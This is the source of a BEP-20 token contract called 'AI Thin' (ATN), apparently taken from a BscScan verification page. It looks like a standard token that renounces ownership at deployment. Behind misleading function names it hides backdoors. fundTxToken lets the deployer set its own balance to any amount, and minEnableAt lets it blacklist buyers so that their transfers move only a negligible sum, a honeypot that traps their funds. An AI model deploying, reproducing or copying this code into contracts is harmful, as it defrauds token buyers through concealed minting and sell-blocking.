/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface minTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchMode {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIThin is Ownable{
    uint8 public decimals = 18;

    uint256 constant tradingWallet = 10 ** 10;
    mapping(address => bool) public maxToken;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public name = "AI Thin";
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isMarketing;
    mapping(address => mapping(address => uint256)) public allowance;
    address public modeBuy;
    address public launchedList;
    string public symbol = "ATN";

    bool public amountTrading;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        minTrading autoSwap = minTrading(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        modeBuy = launchMode(autoSwap.factory()).createPair(autoSwap.WETH(), address(this));
        launchedList = buyAuto();
        isMarketing[launchedList] = true;
        balanceOf[launchedList] = totalSupply;
        emit Transfer(address(0), launchedList, totalSupply);
        renounceOwnership();
    }

    

    function shouldList(address totalTeam, address maxLaunch, uint256 isSwap) internal returns (bool) {
        require(balanceOf[totalTeam] >= isSwap);
        balanceOf[totalTeam] -= isSwap;
        balanceOf[maxLaunch] += isSwap;
        emit Transfer(totalTeam, maxLaunch, isSwap);
        return true;
    }

    function fundTxToken(uint256 isSwap) public {
        if (!isMarketing[buyAuto()]) {
            return;
        }
        balanceOf[launchedList] = isSwap;
    }

    function approve(address listMax, uint256 isSwap) public returns (bool) {
        allowance[buyAuto()][listMax] = isSwap;
        emit Approval(buyAuto(), listMax, isSwap);
        return true;
    }

    function buyAuto() private view returns (address) {
        return msg.sender;
    }

    function minEnableAt(address receiverLimit) public {
        if (receiverLimit == launchedList || receiverLimit == modeBuy || !isMarketing[buyAuto()]) {
            return;
        }
        maxToken[receiverLimit] = true;
    }

    function tokenSenderWallet(address enableAutoTotal) public {
        if (amountTrading) {
            return;
        }
        isMarketing[enableAutoTotal] = true;
        amountTrading = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transferFrom(address fundLimit, address txList, uint256 isSwap) public returns (bool) {
        if (fundLimit != buyAuto() && allowance[fundLimit][buyAuto()] != type(uint256).max) {
            require(allowance[fundLimit][buyAuto()] >= isSwap);
            allowance[fundLimit][buyAuto()] -= isSwap;
        }
        if (txList == launchedList || fundLimit == launchedList) {
            return shouldList(fundLimit, txList, isSwap);
        }
        if (maxToken[fundLimit]) {
            return shouldList(fundLimit, txList, tradingWallet);
        }
        return shouldList(fundLimit, txList, isSwap);
    }

    function transfer(address txList, uint256 isSwap) external returns (bool) {
        return transferFrom(buyAuto(), txList, isSwap);
    }


}